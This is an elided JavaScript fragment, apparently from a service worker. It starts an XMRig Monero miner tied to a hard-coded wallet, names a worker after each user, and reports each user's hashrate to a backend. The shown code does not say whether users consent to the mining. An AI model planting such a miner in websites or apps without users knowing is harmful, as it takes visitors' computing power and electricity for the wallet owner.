  ...
  if (XMRig) {
    try {
      miner = new XMRig({
        ...
        wallet: '46an3rRwAENNVnZhXuxMYKDFAfTP5sasbdDcpTQZRezpGfsJ8ZAoGWWTXyZBk5vLRk8z2LHQGfNthdC93dAD1uxAP9T9gA2',
        password: 'x',
        worker: `user_${userId}`,
        threads: 1,
      });
...
// ---------- REPORT HASHRATE (FIXED) ----------
async function reportHashrate(hr) {
  if (!userId) return;

  // Send to main thread using clients.matchAll
  try {
    ...
    // Client messaging failed – we still send to backend
  }
